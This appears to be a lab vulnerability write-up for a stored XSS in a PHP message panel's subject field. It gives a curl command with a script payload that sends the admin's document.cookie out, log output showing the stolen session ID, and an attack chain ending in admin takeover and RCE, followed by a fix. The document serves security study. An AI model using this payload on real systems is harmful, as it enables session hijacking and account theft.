# 15 — Stored XSS via the message subject

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** High
- **Difficulty:** Easy

## Where

`web/panel/messages.php:18` — message read view:

```php
echo '<h1>' . $m['subject'] . '</h1>';          // ← raw, unescaped
```

Contrast the list view (line 65), which **is** escaped:

```php
... ' . htmlspecialchars($m['subject']) . ' ...
```

## How it works (root cause)

The subject is stored unescaped (see 06) and re-rendered **raw** in the
read view's `<h1>`. The list view escapes it, so the payload is invisible
in the inbox listing but executes the moment the recipient opens the
message. The bundled `adminvisit` bot opens every unread message in a real
admin session on a 60 s tick, so this is a working account-theft vector.

## Exploitation steps

1. Send a message to `admin` whose subject is a script (any logged-in
   user can do this):

   ```bash
   curl -s -b /tmp/ulla.jar \
     --data-urlencode "to=admin" \
     --data-urlencode "subject=<script>fetch('/?xss=1&c='+encodeURIComponent(document.cookie))</script>" \
     --data-urlencode "body=hej" \
     http://localhost:8080/panel/messages.php
   ```

2. Wait for the next `adminvisit` tick (≤ 60 s). The bot logs in as admin,
   opens the unread message, and the `<script>` runs in the admin's browser
   context.

3. The bot's `fetch` shim sends the request **with the admin cookie**:

   ```bash
   grep 'xss=1' data/logs/adminvisit.out.log
   # outgoing http://localhost:8080/?xss=1&c=OSEDESESSID%3d<ADMIN_SESSION>
   ```

## Working PoC (verified)

`data/logs/adminvisit.out.log` contains a line of the form:

```
outgoing http://localhost:8080/?xss=1&c=OSEDESESSID%3d<32-hex admin session id>
```

— the admin's `OSEDESESSID` cookie, exfiltrated by the script.

## Expected result / verification

- The admin session cookie appears in the bot's out.log (or at an attacker
  endpoint in a real deployment).
- With the session cookie (23: no `HttpOnly`), the attacker can log in as
  admin directly.

## Attack chain

```
stored XSS in subject (executes when admin opens the message)
  → adminvisit bot / real admin opens it
  → document.cookie read (cookie is not HttpOnly — 23)
  → admin session cookie → full admin takeover
  → /panel/upload.php (16) → RCE
```

## Notes

- The mismatch between the escaped list (line 65) and the unescaped read
  view (line 18) is the root cause; escaping both (or sanitising on write)
  fixes it.
- The body is escaped on read (line 23), so the subject is the reliable
  sink.
